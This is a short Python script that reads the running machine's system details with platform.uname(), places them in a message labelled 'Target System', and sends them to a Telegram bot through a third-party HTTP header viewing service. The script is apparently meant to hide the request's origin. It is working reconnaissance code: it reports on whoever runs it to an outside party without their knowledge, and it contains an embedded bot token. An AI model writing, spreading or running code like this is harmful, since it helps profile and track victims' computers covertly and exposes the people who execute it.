import requests
import platform 
info = platform.uname()
url = "https://api.telegram.org/bot1608836427:AAGn1y1BbMZtiRLnClGTODzJ7U32hdQr_kk/SendMessage?chat_id=1119653364&text=Target System >>> "+str(info)
payload = {"UrlBox":url,  
"AgentList":"Mozilla Firefox",
"VersionsList":"HTTP/1.1",
"MethodList":"POST"
}

r = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload)

